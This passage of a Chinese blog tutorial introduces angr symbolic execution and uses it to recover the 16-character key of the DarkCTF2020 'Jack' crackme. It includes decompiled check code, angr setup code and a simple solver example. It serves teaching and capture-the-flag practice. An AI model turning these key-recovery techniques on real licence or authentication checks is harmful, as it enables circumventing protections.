class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bool main(void)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  uint uVar1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size_t sVar2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  long in_FS_OFFSET;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  uint local_38;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int local_34;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int local_30;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int local_2c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_28;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_26;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_25;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_24;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_23;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_22;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_21;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_20;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_1f;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_1e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_1d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_1c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_1b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_1a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char local_19;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  undefined local_18;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  long local_10;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  local_10 = *(long *)(in_FS_OFFSET + 0x28);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(&amp;quot;Enter your key: &amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fgets(&amp;amp;local_28,0x11,stdin);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  local_18 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sVar2 = strlen(&amp;amp;local_28);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if (sVar2 != 0x10) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&amp;quot;Try Harder&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_38 = local_25 * 0x1000000 + (int)local_28 + local_27 * 0x100 + local_26 * 0x10000;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_38 = local_38 ^ ((int)local_38 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + local_38 * 0x20;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_38 = local_38 ^ local_38 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_38 = (local_38 &amp;gt;&amp;gt; 1 &amp;amp; 0xff) + local_38;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_38 = ((int)local_38 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + local_38 * 0x20 ^ local_38;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_38 = local_38 ^ local_38 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_38 = local_38 + (local_38 &amp;gt;&amp;gt; 1 &amp;amp; 0xff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = local_21 * 0x1000000 + (int)local_24 + local_23 * 0x100 + local_22 * 0x10000;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ ((int)uVar1 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + uVar1 * 0x20;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ uVar1 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = (uVar1 &amp;gt;&amp;gt; 1 &amp;amp; 0xff) + uVar1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = ((int)uVar1 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + uVar1 * 0x20 ^ uVar1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ uVar1 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_34 = uVar1 + (uVar1 &amp;gt;&amp;gt; 1 &amp;amp; 0xff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = local_1d * 0x1000000 + (int)local_20 + local_1f * 0x100 + local_1e * 0x10000;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ ((int)uVar1 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + uVar1 * 0x20;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ uVar1 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = (uVar1 &amp;gt;&amp;gt; 1 &amp;amp; 0xff) + uVar1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = ((int)uVar1 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + uVar1 * 0x20 ^ uVar1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ uVar1 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_30 = uVar1 + (uVar1 &amp;gt;&amp;gt; 1 &amp;amp; 0xff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = local_19 * 0x1000000 + (int)local_1c + local_1b * 0x100 + local_1a * 0x10000;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ ((int)uVar1 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + uVar1 * 0x20;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ uVar1 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = (uVar1 &amp;gt;&amp;gt; 1 &amp;amp; 0xff) + uVar1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = ((int)uVar1 &amp;gt;&amp;gt; 3 &amp;amp; 0x20000000U) + uVar1 * 0x20 ^ uVar1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uVar1 = uVar1 ^ uVar1 &amp;lt;&amp;lt; 7;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    local_2c = uVar1 + (uVar1 &amp;gt;&amp;gt; 1 &amp;amp; 0xff);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    check_flag(&amp;amp;local_38);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return sVar2 != 0x10;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    /* WARNING: Subroutine does not return */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stack_chk_fail();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;看到这我们可以确定输入有16个字符长。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if (sVar2 != 0x10) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&amp;quot;Try Harder&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;然后经过一连串的异或移位，加法，乘法之后，调用了check_flag&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/* check_flag(unsigned int*) */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void check_flag(uint *param_1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ((((*param_1 == 0xcb9f59b7) &amp;amp;&amp;amp; (param_1[1] == 0x5b90f617)) &amp;amp;&amp;amp; (param_1[2] == 0x20e59633)) &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     (param_1[3] == 0x102fd1da)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&amp;quot;Good Work!&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(&amp;quot;Try Harder&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;假设我们的目标是来到“Good Work!”这一行。我们需要找到程序的正确的输入，（也许这里有多个答案，因为这个移位操作）。&lt;/p&gt;
+&lt;p&gt;我们有以下的几个选择：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;gt;暴力破解，16个字符，可能是字母符号数字…暴力太难了&lt;br&gt;&amp;gt;逆向-动态/静态分析，尽管逆向不是很有趣，我们也可以在运行时改变一下param_1的值通过hook的方式…&lt;br&gt;&amp;gt;打补丁，通过打补丁的方式让他到puts这里。但让我们假设我们不想做任何的改变。&lt;br&gt;&amp;gt;符号执行（Angr），我们今天的明显选择。另外，它为我们提供了一个实际有效的程序输入。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;Angr&#34;&gt;&lt;a href=&#34;#Angr&#34; class=&#34;headerlink&#34; title=&#34;Angr&#34;&gt;&lt;/a&gt;Angr&lt;/h3&gt;&lt;p&gt;首先我们加载需要的库：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import angr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import claripy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;接下来，我们将设置程序的基地址并通过 Angr 加载二进制文件。&lt;br&gt;我们会设置程序的基地址，并且设置”auto_load_libs”为false。&lt;br&gt;&lt;em&gt;注意：设置”auto_load_libs”为false，将禁止CLE（Angr的二进制文件加载器）自动处理动态库依赖。我建议使用它，防止当某个动态库无法找到时，抛出异常。&lt;/em&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# Ghidra loaded the binary to 0x00100000 (default Image Base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base_addr = 0x00100000 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proj = angr.Project(&amp;#x27;./jack&amp;#x27;, main_opts=&amp;#123;&amp;#x27;base_addr&amp;#x27;: base_addr&amp;#125;, load_options=&amp;#123;&amp;quot;auto_load_libs&amp;quot;: False&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;填上我们收集的二进制文件信息：&lt;br&gt;我们知道我们的输入需要16个字符的长度，因此，我们需要为我们的16个字符创建一个符号位向量。在把它们链接到一起之前，我为每个输入字节创建一个位向量。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;注意：位向量本质只是一串位序列，一个符号位向量只是一个符号变量，它在某种意义上不是保存具体的数值，而是保存一个符号。然后，使用该变量执行算术运算将产生一个运算树（根据编译器理论称为抽象语法树或 AST）。如示例中所示，AST 可以转换为约束。&lt;/em&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;input_length = 16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# claripy.BVS(&amp;#x27;x&amp;#x27;, 8) =&amp;gt; Create an eight-bit symbolic bitvector &amp;quot;x&amp;quot;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Creating a symbolic bitvector for each character:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input_chars = [claripy.BVS(&amp;quot;char_%d&amp;quot; % i, 8) for i in range(input_length)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input = claripy.Concat(*input_chars)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+<p>
+		
+
+	
+
+	</div>
+  <a type="button" href="/2021/06/26/Angr初探/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><pre><code>首先我将简要介绍一下Angr，因为我认为知道我们的工具如何工作是很重要的一件事情。
+</code></pre>
+<h2 id="二、符号执行-简要介绍"><a href="#二、符号执行-简要介绍" class="headerlink" title="二、符号执行 - 简要介绍"></a>二、符号执行 - 简要介绍</h2><p>Angr是一个python模块的，我将使用它作为二进制分析的框架。它是采用动态和静态结合的方式来进行符号分析的工作。这种工作方式被叫做“导向性随机测试”，虽然如此，但是大家基本叫它符号执行/分析引擎。</p>
+<h3 id="什么是符号执行？"><a href="#什么是符号执行？" class="headerlink" title="什么是符号执行？"></a>什么是符号执行？</h3><pre><code>符号执行就是通过用“符号”值替换程序的输入值来模拟程序的执行。随着执行模拟的进行，每当处理输入时，执行程序的约束条件都会被添加到“符号”值中。 当遇到分支条件时，模拟分为两条路径：一条路径分支条件评估为真，另一条路径评估为假。
+</code></pre>
+<p>通俗的说，就是用符号去替换输入的值。用符号值执行程序会建立起约束的边界。<br>看下面的一个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// Assume a &amp; b are controlled by the user</span><br><span class="line">if (a &gt; b)</span><br><span class="line">  a = a - b;</span><br><span class="line">else b = b - a;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，左分支的约束是 a&gt;b，而右分支的约束是 a&lt;=b。</p>
+<p>真实世界的程序肯定不会如此简单，代码分支深处的约束会变得非常大、非常快。为了解决这些限制，Angr使用了微软的定理证明器Z3。Z3检查约束是否可满足 (SAT)。假设某个分支有可满足的约束，我们可以要求Angr给出一个满足约束的输入的例子。</p>
+<h2 id="三、Angr-基础使用"><a href="#三、Angr-基础使用" class="headerlink" title="三、Angr - 基础使用"></a>三、Angr - 基础使用</h2><p>下面是一个Angr基础使用的用法示例。在下面的例子中，我们将会添加约束条件，并让Angr去执行它。<br>考虑下面的代码片段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void main(int argc, char *argv[])&#123;</span><br><span class="line">    int a=atoi(argv[1]);</span><br><span class="line">    int b=atoi(argv[2]);</span><br><span class="line">    if (10 &gt; a &amp;&amp; a &gt; 5 &amp;&amp; 10 &gt; b &amp;&amp; b &gt; 1 &amp;&amp; 2*b - a == 10)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;[+] Math is hard... but not 4 u! \n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们将会使用Angr手工的加上约束条件，然后使用内置的求解器（solver）进行求解。这与我们通常使用Angr的方式不同，它只是在我们深入研究复杂案例之前展示一下的例子。</p>
+<p>带上注释一步一步的用iPython命令，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Importing angr</span></span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> angr </span><br><span class="line"></span><br><span class="line"><span class="comment"># A wrapper for Z3. Claripy is used for constraint-solving.</span></span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">import</span> claripy </span><br><span class="line"></span><br><span class="line"><span class="comment"># Loading the binary to angr. </span></span><br><span class="line">In [<span class="number">3</span>]: p = angr.Project(<span class="string">&#x27;./a.out&#x27;</span>) </span><br><span class="line">WARNING | <span class="number">2021</span>-05-<span class="number">24</span> <span class="number">17</span>:<span class="number">54</span>:05,<span class="number">450</span> | cle.loader | The main binary <span class="keyword">is</span> a position-independent executable. It <span class="keyword">is</span> being loaded <span class="keyword">with</span> a base address of <span class="number">0x400000</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># Constructs a state ready to execute at the binary&#x27;s entry point.</span></span><br><span class="line">In [<span class="number">4</span>]: state = p.factory.entry_state() </span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a bitvector symbol named &quot;a&quot; of length 32 bits</span></span><br><span class="line">In [<span class="number">5</span>]: a = state.solver.BVS(<span class="string">&quot;a&quot;</span>, <span class="number">32</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a bitvector symbol named &quot;b&quot; of length 32 bits</span></span><br><span class="line">In [<span class="number">6</span>]: b = state.solver.BVS(<span class="string">&quot;b&quot;</span>, <span class="number">32</span>) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; Adding constraints manually &#x27;&#x27;&#x27;</span></span><br><span class="line">In [<span class="number">7</span>]: state.solver.add(<span class="number">10</span>&gt;a) </span><br><span class="line">Out[<span class="number">7</span>]: [&lt;Bool a_39_32 &lt; <span class="number">0xa</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: state.solver.add(a&gt;<span class="number">5</span>)</span><br><span class="line">Out[<span class="number">8</span>]: [&lt;Bool a_39_32 &gt; <span class="number">0x5</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: state.solver.add(b&gt;<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">9</span>]: [&lt;Bool b_40_32 &gt; <span class="number">0x1</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: state.solver.add(b&lt;<span class="number">10</span>)</span><br><span class="line">Out[<span class="number">10</span>]: [&lt;Bool b_40_32 &lt; <span class="number">0xa</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: state.solver.add(<span class="number">2</span>*b - a == <span class="number">10</span>)</span><br><span class="line">Out[<span class="number">11</span>]: [&lt;Bool <span class="number">0x2</span> * b_40_32 - a_39_32 == <span class="number">0xa</span>&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Evaluates the value of &quot;a&quot; by taking the current constraints into consideration.</span></span><br><span class="line">In [<span class="number">12</span>]: state.solver.<span class="built_in">eval</span>(a)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Evaluates the value of &quot;b&quot; by taking the current constraints into consideration.</span></span><br><span class="line">In [<span class="number">13</span>]: state.solver.<span class="built_in">eval</span>(b)</span><br><span class="line">Out[<span class="number">13</span>]: <span class="number">8</span></span><br></pre></td></tr></table></figure>
+
+<p>现在我们有了这些基础之后，让我们转到主要的事情上：</p>
+<h2 id="四、逆向混淆的二进制文件"><a href="#四、逆向混淆的二进制文件" class="headerlink" title="四、逆向混淆的二进制文件"></a>四、逆向混淆的二进制文件</h2><p>我们使用的二进制文件是“<a target="_blank" rel="noopener" href="https://ctftime.org/event/1118">DarkCTF2020</a>”的“<a target="_blank" rel="noopener" href="https://napongizero.github.io/blog/assets/Defeating-Code-Obfuscation-with-Angr/jack">Jack</a>”</p>
+<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p>首先收集一些二进制文件的基础信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file ./jack</span><br><span class="line">./jack: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f530c71efca944a196fe383afcd8df60591edf78, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>执行下文件，并且使用ltrace去trace写库函数。</p>
